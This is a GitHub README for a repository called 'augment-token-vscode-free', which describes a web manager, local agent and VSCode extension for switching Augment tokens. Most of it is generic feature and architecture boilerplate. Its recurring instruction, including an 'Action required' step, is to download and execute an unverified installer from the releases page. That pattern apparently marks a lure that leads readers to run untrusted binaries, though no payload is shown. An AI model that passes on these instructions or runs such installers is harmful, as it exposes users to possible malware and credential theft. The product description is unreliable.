[![Releases](https://img.shields.io/github/v/release/wuhongfeiiiii/augment-token-vscode-free?label=Releases&color=0da7ff&logo=github)](https://github.com/wuhongfeiiiii/augment-token-vscode-free/releases)

# Augment Token Manager — Seamless VSCode Token Switch & Share

![VSCode Token](https://code.visualstudio.com/assets/images/code-stable.png)

A focused web service to generate, store, and rotate Augment access tokens and to pair those tokens with a VSCode extension for automatic account switching. This repo collects tools, scripts, and installer assets you can use with your team and your development environment.

Badges
- Build: ![Build](https://img.shields.io/badge/build-pending-lightgrey)
- License: ![License](https://img.shields.io/badge/license-MIT-green)
- Releases: [View releases](https://github.com/wuhongfeiiiii/augment-token-vscode-free/releases)

Features

- Authentication
  - OAuth2 login for GitHub and LinuxDo accounts.
  - Single identity that links multiple provider accounts.
  - Token approval flow that follows standard OAuth scopes.
- Token lifecycle
  - Generate Augment tokens per tenant.
  - Show token status and expiry.
  - Bulk revoke or renew tokens.
  - Secure wipe of tokens and audit records.
- VSCode integration
  - Pair tokens with the Augment VSCode extension.
  - Automatic token selection based on workspace or remote host.
  - Push token to the local VSCode key store with user consent.
- Team operations
  - Transfer tokens to teammates with scoped permissions.
  - Role-based access for token use and transfer.
  - Audit trail for token creation, use, and transfer.
- Operational controls
  - Rate limit token creation.
  - Token tagging, naming, and ownership rules.
  - API for automation and CI/CD use.

Why use this repo

- Central store for token tooling and installers.
- Scripts to wire the web manager to the VSCode extension.
- Release builds for platform installers and helper agents.

Quick start

1. Open the releases page linked above or at:
   https://github.com/wuhongfeiiiii/augment-token-vscode-free/releases

2. Download and execute the installer file for your platform from the releases page.
   - The releases page includes binary assets and zip archives.
   - Pick the asset that matches your OS (Windows .exe, macOS .dmg or .pkg, Linux .sh or .tar.gz).
   - Run the installer or unpack and run the agent script.

3. Visit the web manager and create your first token
   - Create or sign in with a supported identity provider.
   - Add a tenant URL for your Augment environment.
   - Generate a token and copy the token string.

4. Configure the VSCode extension
   - Install the Augment extension in VSCode.
   - Open the extension settings.
   - Paste the token into the extension field.
   - The extension will claim the token and update the local status.

Downloads and installers

- Primary release page:
  https://github.com/wuhongfeiiiii/augment-token-vscode-free/releases

- Action required:
  Download the latest release asset from the link above and execute the installer file for your environment. The release asset contains the web client helper, the local agent, and the VSCode configuration script.

Architecture overview

- Web Manager
  - Hosts token creation UI, audit logs, and team controls.
  - Uses OAuth2 for authentication and issues scoped tokens.
  - Stores tokens encrypted with per-tenant keys.
- Local Agent
  - Runs on developer machines.
  - Receives sealed tokens from the web manager and stores them in the system key store.
  - Notifies the VSCode extension of token changes.
- VSCode Extension
  - Requests tokens from the local agent.
  - Resolves which token to use by workspace rules and host context.
  - Calls Augment APIs with the active token.

Common flows

- Generate a new token
  - Sign in to the manager.
  - Add tenant endpoint.
  - Click Generate.
  - Copy token or transfer it to another user.

- Switch accounts inside VSCode
  - Open a workspace.
  - The extension asks the local agent for a token.
  - The agent selects a token based on workspace rules.
  - The extension uses the token to perform API calls.

- Revoke a token
  - Find the token in the manager.
  - Click Revoke.
  - The system pushes a revoke event to connected agents and the extension.

Security model

- Tokens encrypt at rest using tenant-specific keys.
- Tokens transit the network over TLS with HSTS.
- OAuth2 sessions use short-lived refresh tokens where possible.
- Transfer operations require authorization and create an audit entry.
- Agents store tokens in the OS key store (Keychain, Windows Credential Manager, or libsecret).

Operational tips

- Create separate tokens for CI systems. Limit scopes and set expiry.
- Tag tokens by purpose: dev, ci, deploy, test.
- Rotate long-lived tokens monthly or per release.
- Use transfer with restricted scopes for shared automation.

Configuration reference

- Web manager environment variables
  - APP_URL — public URL for the manager.
  - OAUTH_GITHUB_CLIENT_ID — GitHub OAuth client id.
  - OAUTH_LINUXDO_CLIENT_ID — LinuxDo OAuth client id.
  - ENCRYPTION_KEY — master key for token encryption.
  - DB_URL — Postgres or supported DB connection string.

- Local agent flags
  - --listen — local socket or path for VSCode extension.
  - --store — select key store: keychain, wincred, libsecret.
  - --log-level — info, warn, error.

- VSCode extension settings
  - augment.tokenStore — path or socket to the local agent.
  - augment.tenantUrl — default tenant when none match the workspace.
  - augment.autoSwitch — boolean to enable automatic token selection.

API and automation

- REST endpoints
  - POST /api/tokens — create a token (requires auth).
  - GET /api/tokens — list tokens for the user.
  - POST /api/tokens/{id}/revoke — revoke a token.
  - POST /api/tokens/{id}/transfer — transfer a token to another user.

- Example curl to create a token (replace placeholders)
  curl -X POST https://your-manager.example/api/tokens \
    -H "Authorization: Bearer $MGMT_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"tenant":"https://tenant.example","name":"ci-token","scopes":["read","deploy"]}'

- Use automation to generate tokens on release or CI jobs and store them in a secret manager.

Team and collaboration

- Roles
  - Owner — full access, manage team settings.
  - Admin — manage tokens and users.
  - Developer — create and use tokens.
  - Auditor — view logs and events.

- Share a token
  - Open the token details.
  - Click Transfer.
  - Select team or a specific user.
  - Set transfer scope and expiry.

- Auditing
  - Each action logs user, time, and client.
  - Download audit CSV for compliance.

Troubleshooting

- Agent fails to start
  - Check system key store permissions.
  - Confirm agent has access to its configuration file.
- Extension cannot find token
  - Check augment.tokenStore setting in VSCode.
  - Confirm the agent listens on the configured socket or path.
- Token rejected by Augment API
  - Verify tenant URL matches token scope.
  - Check token expiry and revoke status.

FAQ

- Can I use multiple tenants?
  - Yes. You may create tokens per tenant. The manager groups tokens by tenant.
- How does the agent pick a token?
  - The agent uses workspace metadata and host detection rules to select a token.
- Can I script token creation?
  - Yes. Use the REST API with a management token.

Contributing

- Fork the repo.
- Create a feature branch.
- Add tests for new behavior.
- Open a pull request with a clear description and issue link.
- Use the repository CI to run checks.

Releases and downloads

- Visit the releases page and pick the asset that matches your OS:
  https://github.com/wuhongfeiiiii/augment-token-vscode-free/releases

- After you download the release asset, execute the installer file for your platform to install the web helper, agent, and scripts. The release assets include checksums and signatures where available.

Assets you may find in a release

- augment-agent-{os}-{arch}.zip or .tar.gz — Local agent binaries and scripts.
- augment-installer-{os}.exe or .pkg — Installers for desktop platforms.
- augment-vscode-setup.vsix — VSCode extension package for manual install.
- docs.tar.gz — Offline docs and examples.

Images and resources

- VSCode icon: https://code.visualstudio.com/assets/images/code-stable.png
- Token icon example: https://upload.wikimedia.org/wikipedia/commons/8/8f/Key_Icon.svg
- Team icon example: https://upload.wikimedia.org/wikipedia/commons/7/7e/Users_icon.svg

License

- MIT — See the LICENSE file for full terms.

Contact and support

- File issues on GitHub with labels: bug, feature, docs.
- For security issues, open a private issue or email the maintainer listed in the repository profile.

Directories in this repo (what to expect)

- /agent — local agent source and release bundles.
- /extension — VSCode extension source and build scripts.
- /web — UI and API server code.
- /deploy — Docker and k8s manifests for production.
- /docs — design notes, API specs, and workflows.

Changelog

- See the releases page for change logs and packaged assets:
  https://github.com/wuhongfeiiiii/augment-token-vscode-free/releases

Contribute code, report bugs, or request features through pull requests and issues on GitHub.